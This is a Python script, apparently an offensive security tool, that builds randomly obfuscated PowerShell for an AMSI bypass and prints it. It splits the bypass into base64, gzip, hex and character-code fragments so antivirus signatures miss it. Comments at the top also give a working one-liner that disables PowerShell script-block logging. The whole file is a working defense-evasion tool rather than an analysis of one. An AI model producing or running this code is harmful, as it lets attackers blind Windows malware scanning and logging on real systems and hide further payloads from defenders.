#!/usr/bin/python3

import base64
import random
import string
import gzip
import urllib3

# Building an obfuscator for the following line for an AMSI Bypass
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# The following powershell disables scriptblock logging
# [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)


def obfBase64(strI):
    randVarName = ''.join(random.choices(string.ascii_lowercase, k=5))
    obfInfo = "$" + randVarName + " = '" + (base64.b64encode(strI.encode('ascii'))).decode('ascii') + "'"
    functionInfo = "([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("
    functionInfo += "$" + randVarName
    functionInfo += ")))"
    return obfInfo + "|" + functionInfo


def obfLetters(strI):
    randVarName = ''.join(random.choices(string.ascii_lowercase, k=5))
    obfInfo = ""
    for letter in strI:
        obfInfo += "'" + letter + "'" + "+"
    obfInfo = "$" + randVarName + " = (" + obfInfo[:-1] + ")"
    functionInfo = "$" + randVarName
    return obfInfo + "|" + functionInfo

def obfGzip(strI):
    randVarName = ''.join(random.choices(string.ascii_lowercase, k=5))
    gzInfo = gzip.compress(strI.encode())
    b64Info = (base64.b64encode(gzInfo)).decode('ascii')
    obfInfo = "$" + randVarName + " = '" + b64Info + "'"
    functionInfo = "((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream"
    functionInfo +=  "((New-Object IO.MemoryStream(,[Convert]::FromBase64String("
    functionInfo +=  "$" + randVarName
    functionInfo += "))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd())"
    #print(functionInfo)
    return obfInfo + "|" + functionInfo

def obfGzipLetters(strI):
    randVarName = ''.join(random.choices(string.ascii_lowercase, k=5))
    gzInfo = gzip.compress(strI.encode())
    b64Info = (base64.b64encode(gzInfo)).decode('ascii')
    b64Str = ""
    for letter in b64Info:
        b64Str += "'" + letter + "'+"
    b64Str = b64Str[1:-2]
    obfInfo = "$" + randVarName + " = '" + b64Str + "'"
    functionInfo = "((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream"
    functionInfo +=  "((New-Object IO.MemoryStream(,[Convert]::FromBase64String("
    functionInfo +=  "$" + randVarName
    functionInfo += "))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd())"
    #print(functionInfo)
    return obfInfo + "|" + functionInfo

def obfCharByte(strI):
    randVarName = ''.join(random.choices(string.ascii_lowercase, k=5))
    obfInfo = ""
    for letter in strI:
        obfInfo += "[char][byte]" + str(ord(letter)) + "+"
    obfInfo = "$" + randVarName + " = (" + obfInfo[:-1] + ")"
    functionInfo = "$" + randVarName
    return obfInfo + "|" + functionInfo

def obfHex(strI):
    randVarName = ''.join(random.choices(string.ascii_lowercase, k=5))
    strInfo = ""
    for letter in strI:
        strInfo += str((letter.encode('ascii')).hex().upper()) + " "
    obfInfo = "$" + randVarName + " = '" + strInfo[:-1] + "'"
    functionInfo = "($($($r=("
    functionInfo += "$" + randVarName
    functionInfo += ".Split(' ')));$($j='');$(ForEach ($i in $r){$j+=[char]([convert]::toint16($i,16))});$($j)))"
    #print(functionInfo)
    return obfInfo + "|" + functionInfo
    

def randomizeProc(strInput):
    rInt = random.randint(0,5)
    if rInt == 0:
        # base64
        strOutput = obfBase64(strInput)
    elif rInt == 1:
        strOutput = obfLetters(strInput)
    elif rInt == 2: 
        strOutput = obfGzip(strInput)
    elif rInt == 3:
        strOutput = obfGzipLetters(strInput)
    elif rInt == 4:
        strOutput = obfCharByte(strInput)
    elif rInt == 5:
        strOutput = obfHex(strInput)
    strVar, strFunc = strOutput.split("|")
    return strVar, strFunc


def main():
    
    #amsiBypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"   
    sV0, sF0 = randomizeProc("Assembly")
    sV1, sF1 = randomizeProc("GetType")
    sV2, sF2 = randomizeProc("System.Management.Automation.AmsiUtils")
    sV3, sF3 = randomizeProc("GetField")
    sV4, sF4 = randomizeProc("amsiInitFailed")
    sV5, sF5 = randomizeProc("NonPublic,Static")
    sV6, sF6 = randomizeProc("SetValue")
    amsiBypass = sV0 + "\n"
    amsiBypass += sV1 + "\n"
    amsiBypass += sV2 + "\n"
    amsiBypass += sV3 + "\n"
    amsiBypass += sV4 + "\n"
    amsiBypass += sV5 + "\n"
    amsiBypass += sV6 + "\n"
    amsiBypass += "[Ref]."
    #amsiBypass += randomizeProc("Assembly")
    amsiBypass += sF0
    amsiBypass += "."
    #amsiBypass += "GetType"
    amsiBypass += sF1
    amsiBypass += "("
    #amsiBypass += "System.Management.Automation.AmsiUtils"
    amsiBypass += sF2
    amsiBypass += ")."
    #amsiBypass += "GetField"
    amsiBypass += sF3
    amsiBypass += "("
    #amsiBypass += "amsiInitFailed"
    amsiBypass += sF4
    amsiBypass += ","
    #amsiBypass += "NonPublic,Static"
    amsiBypass += sF5
    amsiBypass += ")."
    #amsiBypass += "SetValue"
    amsiBypass += sF6
    amsiBypass += "($null,$true)"
    print("Original AMSI Bypass")   
    print(amsiBypass)
    b64_bytes = base64.b64encode(amsiBypass.encode("ascii"))
    b64_output = b64_bytes.decode("ascii")
    b64_encoded = ""
    for letter in b64_output:
        b64_encoded += "'" + letter + "'+"
    b64_encoded = b64_encoded[:-1]
    allInfo = "([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("
    allInfo += b64_encoded
    allInfo += "))) | Out-File -FilePath a.ps1"
    print("\n\nBase64 AMSI Bypass")
    #print(allInfo)
    
main()